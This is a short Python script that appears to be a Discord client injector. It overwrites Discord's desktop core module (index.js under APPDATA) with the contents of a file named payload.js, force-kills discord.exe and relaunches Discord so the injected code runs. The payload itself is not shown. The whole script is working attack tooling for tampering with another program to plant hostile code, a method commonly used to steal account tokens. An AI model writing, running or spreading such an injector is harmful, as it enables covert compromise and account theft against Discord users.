import glob
import os
payload_file = open("payload.js","r")
payload_content = payload_file.read()
file = open(glob.glob(os.getenv('APPDATA')+'/discord/*/modules/discord_desktop_core/index.js')[0],'w')
file.write(payload_content)
file.close()
try:
    os.system("TASKKILL /F /IM discord.exe")
except:
    "do nothing"
os.startfile(glob.glob(os.getenv('LOCALAPPDATA')+'/Discord/*/Discord.exe')[0])
